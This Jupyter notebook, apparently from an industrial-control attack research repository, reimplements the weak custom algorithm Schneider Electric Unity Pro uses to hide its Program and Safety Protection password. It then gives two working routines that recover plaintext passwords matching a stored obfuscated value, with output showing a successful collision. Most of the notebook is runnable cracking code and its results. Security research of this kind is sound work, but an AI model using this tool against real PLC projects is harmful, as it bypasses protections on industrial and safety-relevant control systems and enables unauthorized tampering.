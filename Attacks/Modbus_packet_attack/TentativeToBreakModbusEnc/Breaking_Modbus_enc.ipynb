{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c85592b4",
   "metadata": {},
   "source": [
    "# Cracking Program and Sefety Protection of the Unity Pro V13.1"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1c64c41",
   "metadata": {},
   "source": [
    "This notebook starts from the work from Armis.\n",
    "\n",
    "See: `https://medium.com/tenable-techblog/examining-crypto-and-bypassing-authentication-in-schneider-electric-plcs-m340-m580-f37cf9f3ff34`\n",
    "\n",
    "In this work Nicholas Miles reverse engineered \"the weak, unknown, non-cryptographically sound custom algorithm\" implemented to hide the Program and Sefety Protection password.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "72d5a70b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's choose a password\n",
    "password = \"password\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "9d230a91",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "local_c0 = 51\n",
      "local_c0 = 55\n",
      "local_c0 = 55\n",
      "local_c0 = 49\n",
      "local_c0 = 51\n",
      "local_c0 = 68\n",
      "local_c0 = 55\n",
      "local_c0 = 83\n",
      "The password password '''encrypted''' (hashed) as 37713D7S\n"
     ]
    }
   ],
   "source": [
    "# The weak, unknown, non-cryptographically sound custom algorithm used by Unity Pro to hide the Program and Sefety Protection password\n",
    "# All credits to Nicholas Miles\n",
    "def crypt_pass(password):\n",
    "    res_str = ''\n",
    "    local_c0 = 0\n",
    "\n",
    "    pwd_data = password.encode('utf-16')[2:]\n",
    "    \n",
    "    for i in range(0, len(password)):\n",
    "        local_6 = pwd_data[(i*2)-1]\n",
    "        local_5 = pwd_data[i*2]\n",
    "\n",
    "        local_14 = 0\n",
    "        for j in range(0, i):\n",
    "            local_14 = local_14 + pwd_data[j*2]\n",
    "\n",
    "        local_10 = 0\n",
    "        for k in range(i+1, len(password)):\n",
    "            local_10 = local_10 + pwd_data[k*2]\n",
    "\n",
    "        if(local_5/2 < local_6):\n",
    "            print(\"enter\")\n",
    "            local_c0 = calc_pass_char((local_5 + 1) * (local_6 + 1) + local_c0 + local_10)\n",
    "            res_str += chr(local_c0)\n",
    "\n",
    "        local_c0 = calc_pass_char(local_c0 * i + local_5 * (i+1) + local_6 *(i+2) + local_14 + local_10)\n",
    "        print(f\"local_c0 = {local_c0}\")\n",
    "        res_str += chr(local_c0)\n",
    "\n",
    "    return res_str\n",
    "\n",
    "def calc_pass_char(tmp):\n",
    "    if(int(tmp) % 2 == 0):\n",
    "        return (int(tmp) % 0x1a) + 0x41\n",
    "    else:\n",
    "        if int(tmp) % 0x10 < 10:\n",
    "            return (int(tmp) % 0x10) + 48\n",
    "        else: \n",
    "            return (int(tmp) % 0x10) + 55\n",
    "# Or equivalently,\n",
    "# def calc_pass_char(byte_):\n",
    "#    return ((byte_ + 1) % 2) * ((byte_ % 0x1a) + 0x41) + (byte_ % 2) * ((((byte_ % 16) % 11) % 2) * ((byte_ % 16) + 48) + ((((byte_ % 16) % 11) + 1) % 2) * ((byte_ % 16) + 55))\n",
    "\n",
    "\n",
    "print(f\"The password {password} '''encrypted''' (hashed) as {crypt_pass(password)}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0e298cd",
   "metadata": {},
   "source": [
    "Given any plaintext password it is possible to find another password' with same encryption.\n",
    "In other words, we don't have a Preimage resistance for this custom hash function.\n",
    "\n",
    "Please find below the code exemple:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "b2c1d05f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import itertools\n",
    "\n",
    "alphabet = list(range(0x60, 0x7a))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "3bda7585",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Searching a collision for the given encrypted password : 37713D7S (== encrypted_pwd)\n",
      "Found a collision plaintext password : 8acccob`\n",
      "local_c0 = 51\n",
      "local_c0 = 55\n",
      "local_c0 = 55\n",
      "local_c0 = 49\n",
      "local_c0 = 51\n",
      "local_c0 = 68\n",
      "local_c0 = 55\n",
      "local_c0 = 83\n",
      "'''Encryption''' of 8acccob` gives 37713D7S (== encrypted_pwd)\n"
     ]
    }
   ],
   "source": [
    "encrypted_pwd = \"37713D7S\" \n",
    "\n",
    "print(f\"Searching a collision for the given encrypted password : {encrypted_pwd} (== encrypted_pwd)\")\n",
    "\n",
    "# Assume letters are between 0 and z\n",
    "l_bound = len(encrypted_pwd)*(0x30) \n",
    "h_bound = len(encrypted_pwd)*(0x7a)\n",
    "\n",
    "enc_i_list = [ord(encrypted_pwd[i]) for i in range(len(encrypted_pwd))]\n",
    "\n",
    "# This function finds one plaintext password character\n",
    "def iterate(enc_i_list, P_guess, acc, depth, max_depth):\n",
    "    if (P_guess < sum(acc) + 0x30): # Assume 1st letter must be between 0 and z\n",
    "        return None\n",
    "    if depth == max_depth:\n",
    "        return acc\n",
    "    for p in range(0x60, 0x7a):\n",
    "        if enc_i_list[depth] == calc_pass_char(enc_i_list[depth-1]*depth + P_guess + p*depth):\n",
    "            acc += [p]\n",
    "            call = iterate(enc_i_list, P_guess, acc, depth + 1, max_depth)\n",
    "            if call == None:\n",
    "                acc = acc[:-1]\n",
    "            else:\n",
    "                return call\n",
    "    return None\n",
    "\n",
    "def decrypt_pass(encrypted_pwd):\n",
    "    for P_guess in range(l_bound, h_bound):\n",
    "        if calc_pass_char(P_guess) == enc_i_list[0]:\n",
    "            tmp = iterate(enc_i_list, P_guess, [], 1, len(encrypted_pwd))\n",
    "            if tmp is not None:\n",
    "                return [P_guess - sum(tmp)] + tmp\n",
    "\n",
    "result = decrypt_pass(encrypted_pwd)\n",
    "result = ''.join([chr(i) for i in result])\n",
    "print(f\"Found a collision plaintext password : {result}\")\n",
    "\n",
    "result_encryption = crypt_pass(result)\n",
    "assert result_encryption == encrypted_pwd\n",
    "\n",
    "print(f\"'''Encryption''' of {result} gives {result_encryption} (== encrypted_pwd)\")\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56f6bc73",
   "metadata": {},
   "source": [
    "Can we do better ? Yes, a bit. By assuming that the characters of password are latin we can find all the possible solutions. This heuristic approach is linear in the lentgh of the password (better than the exponential bruteforce approach)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a5e03276",
   "metadata": {},
   "outputs": [],
   "source": [
    "map_ = {}\n",
    "\n",
    "for i in range(13*2**4):\n",
    "    map_[i] = calc_pass_char(i)\n",
    "\n",
    "inv_map = {}\n",
    "for k, v in map_.items():\n",
    "    inv_map[v] = inv_map.get(v, []) + [k]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "2c35eac6",
   "metadata": {},
   "outputs": [],
   "source": [
    "l_bound = len(encrypted_pwd)*(0x60) \n",
    "h_bound = len(encrypted_pwd)*(0x7a)\n",
    "\n",
    "\n",
    "solutions = [[] for i in range(h_bound-l_bound)]\n",
    "\n",
    "def iterate(enc_i_list, P_guess, P_index, i, max_i):\n",
    "    global solutions \n",
    "    tmp = []\n",
    "    for p in range(0x60, 0x7a):\n",
    "        if (P_guess + p*i + enc_i_list[i-1]*i) % 208 in set(inv_map[enc_i_list[i]]):\n",
    "            tmp += [p]\n",
    "    solutions[P_index] += [tmp]\n",
    "    \n",
    "def decrypt_pass(encrypted_pwd):\n",
    "    pwd_list = []\n",
    "    global solutions\n",
    "    for P_index, P_guess in enumerate(range(l_bound, h_bound)):\n",
    "        if calc_pass_char(P_guess) == enc_i_list[0]:\n",
    "            for i in range(1, len(encrypted_pwd)):\n",
    "                iterate(enc_i_list, P_guess, P_index, i, len(encrypted_pwd))\n",
    "    \n",
    "    for P_index, sol in enumerate(solutions):\n",
    "        if sol is not None:\n",
    "            cart_prod = itertools.product(*sol)\n",
    "            for pwd in cart_prod:\n",
    "                tmp = range(l_bound, h_bound)[P_index] - sum(pwd)\n",
    "                if tmp >= 0x60 and tmp <= 0x7A:\n",
    "                    pwd_list += [chr(tmp) + ''.join([chr(i) for i in pwd])]\n",
    "\n",
    "    return pwd_list\n",
    "\n",
    "solutions = decrypt_pass(encrypted_pwd)\n",
    "\n",
    "assert password in solutions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36991dea",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "SageMath 9.5",
   "language": "sage",
   "name": "sagemath"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
